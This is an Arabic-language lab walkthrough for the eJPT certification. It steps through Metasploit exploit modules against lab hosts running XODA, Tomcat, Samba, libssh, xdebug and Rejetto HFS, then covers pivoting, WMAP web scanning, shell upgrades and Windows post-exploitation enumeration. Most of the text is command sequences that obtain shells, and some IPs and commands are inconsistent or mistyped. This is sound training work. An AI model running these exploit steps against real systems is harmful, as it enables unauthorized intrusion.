# Session 6 (ejpt) - Day 6
##  Host & Network Penetration Testing: The Metasploit Framework (MSF) 


السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نبدأ قسم جديد طبعا فيه قسم ماراح نشرحه لانه مو مره مهم في الوقت الحالي
اسم القسم هو Host & Network Penetration Testing:Network-Based Attacks.  

وزي ماهو موضح باعلى الصفحة راح نبدأ اليوم بقسم الـ Metasploit Framework (MSF).  

---  

راح نبداء باللاب الاول الي هو  

T1046 : Network Service Scanning 
---------------------------------|  


راح نبدا باول لاب معنا اليوم طبعا مره مهم اللاب هذا راح نبدا فيه الان باذن الله  


طبعا اخر مدة نخلص فيها الـ eJPTv2 هو الخميس باذن الله  

طبعا الايبي تبعنا زي العاده نفحص الشبكة لكن بنختصر ويكون التارقت  
Target: 192.125.214.3  

الان راح نفحصه بالـ nmap   
[nmap -sV -sC 192.125.214.3]  
-sC = عشان يستخدم الديفولت سكربت نفس اذا كتبنا --script لكن حنا بناخذ الديفولت ماراح نحدد  

طبعا الان نشوف انه عطانا نتيجة ونشوف انه كتب ان الـ http_title: XODA  

XODA هو CMS طبعا وهذا له اكسبلويت تبحث بقوقل بتحصله  

راح نستخدم الـ msfconsole  
[msfconsole]  
[use exploit/unix/webapp/xoda_file_upload]  
[set RHOSTS 192.125.214.3]  
[set TARGETURI /] نحدد هنا مسار الـ CMS نفسه وبحالتنا موجود بالروت  
[exploit] or [run]  


الان نشوف انه عطانا merterpreter session  

الان راح نفتح الـ shell عن طريق كتابة هالامر في الـ msfconsole  
[shell]  
نشوف انه فتح لنا الشيل الان  

الان بنشوف الانترفيسس الموجوده والايبيات  
[ip addr] هذا الامر عشان يعرض لنا الانترفيس كلها والايبي تبع كل وحده  

الان نشوف انه عندنا انترفيس ثانيه وحده داخلين عليها والثانيه مادخلنا عليها  

طبعا لو تجرب تسوي ping على ايبي الانترفيس الثانيه راح تشوف انه فيه رد ف يعني عندك اتصال  

طبعا لو تحاول تأكسس الانترفيس بتشوف انه ماتقدر طبعا لابد نظيفه داخل الـ autoroute  

عندك موديول وتقدر تسويها يدوي راح نجرب اليدوي الان  
[run autoroute -s 192.76.227.2] الان اضفنا الانترفيس الى الـ autoroute يدويا  

طبعا الان راح نفحص الشبكة الداخليه الي حصلناها او الانترفيس الثانيه بنستخدم موديول طبعا  

[use auxiliary/scanner/portscan/tcp]  
[set RHOSTS 192.125.214.3]  
[set verbose true]  
[set ports 1-1000]  
[exploit] or [run]  

نشوف انه عطانا بعض البورتات مثل الـ FTP, SSH, HTTP  

فهذا احد الاشياء المهمه الي لابد تسويها بعد اختراق الجهاز خاصة في الـ ejpt exam  

طبعا هو سوا سكربت خاص ورفعه لكن النتيجة وحده وهذي اسهل لكن لو حبيت ترفع ملف عن طريق الـ msfconsole  
[session $SID] طبعا تحط رقم السيشن حقتك وبيدخلك عليها  
[upload /PATH-TO-YOUR-FILE.py] وهذا الامر متبوع بباث الملف الي تبي ترفعه وراح ينرفع  

---  

راح نبداء باللاب الثاني الي هو  

Web App Vulnerability Scanning With WMAP 
-----------------------------------------|  

الان راح نتعلم كيف نفحص web عن طريق الـ metasploit  


طبعا ناخذ الايبي سواء تفحص الشبكة او تختصر نفسنا بس اخر اوكت من الايبي زود عليه 1  

طبعا الايبي عندنا  
Target = 192.33.118.3  

راح نفحصه بالـ nmpa كبداية  
[nmap -sV -sC 192.33.118.3]  

نشوف انه عطانا http_title: Apache/2.4.18 طبعا هذا مصاب  


اول شي راح نشغل الداتا بيس 
[sudo msfdb init]  
[services postgresql start]  

خلونا نفتح الـ msfcnsole  
[msfconsole]  
[load wmap] راح نسوي لود او نستدعي هذا الاكستنشن او هذي التول  

طبعا لازم نظيف السايت عن طريق هذا الامر  
[wmap_sites -a 192.33.118.3]  

بعد نحتاج نظيف التارقت مع البروتوكول زي كذا  
[wamp_targets -t http://192.33.118.3]  

طبعا الان اضفنا السايت والتارقت , عشان نستعرض السايتس الي اضفناهم نكتب الامر هذا  
[wmap_sites -l]  

وكذالك عشان نستعرض التارقت الي اضفناهم نكتب الامر هذا  
[wmap_targets -l]  

الان تمام كلشي وتاكدنا خلينا نسوي له run  
[wmap_run -t]  

الان راح يبدا يفحص لك الموقع ويعطيك الموديول الي ممكن تشغلهم على الموقع  

نشوف انه عطانا اول شي معلومات عن التارقت بعدين قعد يجرب الموديولز الي عنده وماحصل شي مهم يعني او يفيدنا فجرب اغلب الموديولز ولا وحده طلعت نتيجة مفيده  

فيه امر ثاني الي هو -e طبعا راح يشغل كل الموديولز الي قبل كلهم ونشوف النتيجة كامله  
[wmap_run -e]  


فاختصار المراحل الي قبل  
[wmap_run -t]  
يعرض لنا الموديولز الي ممكن يشغلهم  

[wmap_run -e]  
يشغل كل الموديولز السابق ويعطينا النتيجة  

ونشوف الان النتيجة كبيره طبعا من مسارات واصدارات وهنا خلص اللاب الثاني  


---

راح نبداء باللاب الثالث الي هو  

Windows: Java Web Server 
-------------------------|  

طيب في هذا اللاب يتكلم عن الـ Java webserver
غالبا يكون السيرفر اما 
Tomcat or spring  
طبعا تسمى framework  


طبعا في هذا اللاب معطينا التارقت ايبي من نفسه والي هو  
Target = 10.0.0.141  


نسوي الان nmap scan  
[nmap -sV -sC 10.0.0.141]  

نشوف انه عطانا انه شغال بورت 80 Apache Tomcat 8.5.19  

طبعا له CVE بنفتح الـ msfconsole  
[msfcnosole]  
[use exploit/multi/http/tomcat_jsp_upload_bypass]  
[set RHOSTS 10.0.0.141]  
[check] راح يتاكد هنا من انه مصاب او لا  
[exploit] or [run]  

نشوف انه عطانا انه مصاب وعطانا Shell  

الان نحصل الفلاق فيه هذا المسار 
[type C:\\flag.txt]  

وطبعنا الفلاق والان انتهى اللاب هذا  

---

راح نبداء باللاب الرابع الي هو  

Vulnerable File Sharing Service 
--------------------------------|  

في هذا اللاب راح نتكلم عن File sharing Services  
ومن الامثله عليه SMB,FTP etc...  

طبعا راح نشوف مع بعض هذا اللاب بنفحص الشبكه او ناخذ التارقت ونزيد اخر رقم 1 ونحصل التارقت  
[nmap -sV -sC 192.189.253.3]  

نشوف الان ان الـ samba شغال وبكذا بنعرف انه linux وكذالك اصدار السيرفس 4.1.17  

وله اكسبلويت في الـ metasploit طبعا خلينا نفتح الفريم وورك ونشوف الاستغلال مع بعض  
[msfconsole]  
[use exploit/linux/samba/is_known_pipename]  
[set RHOST 192.218.210.3]  
[check]  
[exploit] or [run]  

طبعا الان نشوف انه يوم سوينا check قال انه مصاب وفعلا نشوف انه عطانا سيشن  

طبعا تقدر تبحث عن هذا الاستغلال باكثر من طريقه لكن حنا اختصرنا  

الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الخامس الي هو  

Vulnerable SSH server 
----------------------|  

طبعا في هذا اللاب راح نتكلم عن الـ SSH server له CVE  

طبعا راح نشوف مع بعض هذا اللاب بنفحص الشبكه او ناخذ التارقت ونزيد اخر رقم 1 ونحصل التارقت  
[nmap -sV -sC 192.51.205.3]  

طبعا راح نبحث عن الـ SSH version وراح نشوف انه بنحصل الـ CVE طبعا راح نختصر  
```bash
[msfconsole]  
[use auxiliary/scanner/ssh/libssh_auth_bypass]  
[set RHOSTS 192.51.205.3]  
[set SPAWN_PTY true] لو ماكان قيمته ترو ماراح يفتح لك شيل او يسوي سباون لشيل  
[exploit] or [run]  
```  


ونشوف انه فعلا عطانا الشيل الان ومعنا session  

الى هنا انتهى اللاب نشوف الي بعده   

---

راح نبداء باللاب السادس الي هو  

Meterpreter Basics 
------------------|  


في هذا اللاب راح نفصل شوي في اوامر الـ metasploit خاصة في اوامر الـ meterpretere  


طبعا راح نشوف مع بعض هذا اللاب بنفحص الشبكه او ناخذ التارقت ونزيد اخر رقم 1 ونحصل التارقت  
```bash
nmap -sV -sC 192.189.123.3
```  

طبعا نشوف ان البورت 80 شغال وشغال عليه XODA وحنا نعرف انه مصاب  

طبعا الطبيعي انه تسوي fuzzing على المسارات عشان تشوف ايش المسارات الموجوده  

ف نجرب الان نسوي البروت فورس هذا  
```bash
dirb http://192.189.123.3
```  


طبعا حصلنا ملفات كثير اكثر ملف جذبنا او مهم هو الـ phpinfo راح نقراه باداة curl  
```bash
curl http://192.189.123.3/phpinfo.php
```  

ونشوف انه فيه اشياء كثير نشوف انه الـ xdebug مفعل وهذا مصاب راح نبحث ونشوف وبنحصل موديول على الـ msfconsole  

طبعا خلونا نختصر ونفتح الميتاسبلويت ونستغل الثغرة  
```bash
msfconsole
use exploit/unix/http/xdebug_unauth_exec
set RHOSTS 192.189.123.3 [target ip]
set LHOST 192.189.123.2 [attacker ip]
exploit 
```  

ونشوف انه عطانا meterpreter session  

طبعا راح بنشوف بعض الاوامرالي تفيدنا  
```bash
lpwd [your place on your machine]  
pwd [your place on target machine]  
ls [list all files and folders in your place on target machine]  
lls [list all files and folders in your place on your machine]  
downalod name_file.zip [to download any file to your machine from target machine]  
getenv PATH [shortcats for tools like (nmap,fuff) you don't need to be on the seem dir]  
search -d /usr/bin -f *ckdo*[راح يبحث عن الملف بنفس المسار الي محدده انت وبنفس المعطيات انه مايهم وش قبل او بعد الحروف الي هي ckdo مايهم وش قبلها ولا وش بعدها ورمزنا له بالنجمه]  
```  

طبعا هو رفع شيل الان لكن مافي فايده نسويه لكن نعرف طريقته اخذناه مسبقا وفوق موضح كيف تسوي upload  

الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب السابع الي هو  

Upgrading Command Shells To Meterpreter Shells 
-----------------------------------------------|  

طبعا في هذا اللاب بنعرف كيف نرقي الـ Shell to meterpreter session  

طبعا راح نشوف مع بعض هذا اللاب بنفحص الشبكه او ناخذ التارقت ونزيد اخر رقم 1 ونحصل التارقت  
```bash
nmap -sV -sC 192.136.51.3
```  

الان نشوف ان الـ samba شغال وباصدار 4.1.17 مصاب بثغره  

بنشوف الان الاستغلال مع بعض  
```bash
msfconsole  
use exploit/linux/samba/is_known_pipename  
set RHOSTS 192.136.51.3  
exploit  
```  

نشوف انه عطانا non-interactive session الان بنرقيها الى meterpreter session عندنا اكثر من طريقه خل نشوف  

اول طريقة نستخدم موديول معين  
```bash
use post/multi/manage/shell_to_meterpreter  
set SESSION 1  
set LHOST 192.136.51.2  
run  
```  

نشوف انه فتح لنا session ثاني وخلاها لنا meterpreter session  

وفيه طريقة ثانيه واسرع والي هي  
```bash
session -u 1
```  

طبعا الرقم يتغير حسب الـ id session الي عندك وتقدر تشوف الرقم عن طريق 'sessions' command 

الى هنا انتهى اللاب هذا نشوف الي بعده  

---

راح نبداء باللاب الثامن الي هو  

Windows Post Exploitation Modules 
----------------------------------|  

طبعا هنا معطينا التارقت  

Target = 10.5.29.207  

الان نفحص زي العاده  
```bash
nmap -sV -sC 10.5.29.207
```  

ونشوف انه عطانا البورتات ونشوف ان الـ HTTP شغال ومصاب كذالك بنستغل علطول  
```bash
msfconsole  
use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS 10.5.29.207  
exploit  
```  

نشوف انه عطانا meterpreter shell  

الان الي بنسويه بنسوي enumeration عن طريق موديول بعد ماخترقنا الجهاز  

راح نشوف اول موديول معنا الي هو هذا  
```bash
use post/windows/gather/win_privs  
set SESSION 1  
exploit  
```  
طبعا الان عطانا وش الصلاحيات الي عندنا  

نشوف الان موديول ثاني  
```bash
use post/windows/gather/enum_logged_on_users  
set SESSION 1  
exploit  
```  

طبعا هذا الموديول يعطيك ايش اليوزرات الي مسجله دخول الان  

نشوف الان الموديول الثالث  
```bash
use post/windows/gather/checkvm  
set SESSION 1  
exploit  
```  

طبعا هذا الموديول يشيك هل التارقت virtual machine  او لا  

نشوف الان الموديول الرابع  
```bash
use post/windows/gather/enum_applications  
set SESSION 1  
exploit  
```  

هذا الموديول يعرض لك البرامج الي محمله على الجهاز  

طبعا فيه اكثر واكثر تقدرون تجربونها بنفسكم  


الى هنا انتهينا باذن الله راح نكمل بكرا , اعتذر عن الاطاله وباذن الله كان مفيد  

---

## Follow us on:  
Twitter:  (s4cript)[https://twitter.com/s4cript] , (cyberhub)[https://twitter.com/cyberhub] , (0xNawaF1)[https://twitter.com/0xNawaF1]